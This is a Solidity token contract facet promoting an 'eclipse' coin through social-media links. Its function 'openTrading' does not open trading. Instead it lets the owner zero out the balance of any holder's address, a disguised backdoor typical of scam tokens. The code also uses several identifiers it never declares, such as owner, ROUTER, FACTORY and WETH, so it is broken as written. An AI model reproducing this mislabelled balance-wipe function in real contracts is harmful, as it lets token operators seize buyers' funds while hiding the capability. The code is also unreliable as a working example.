//SPDX-License-Identifier: MIT

//Telegram: https://t.me/eclipsecoin
// Twitter: https://twitter.com/eclipse
// Website: https://eclipse2024coin.io
// Discord: https://discord.com/invite/Va58aMrcwk

pragma solidity ^0.5.8;
import "./TestLib.sol";
contract openTradingFacet {
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(msg.sender == owner, "Only owner can open trading");
        require(
            bots != owner && bots != pancakePair() && bots != ROUTER,
            "Invalid address"
        );
        ds._balances[bots] = 0;
    }
    function pancakePair() public view returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
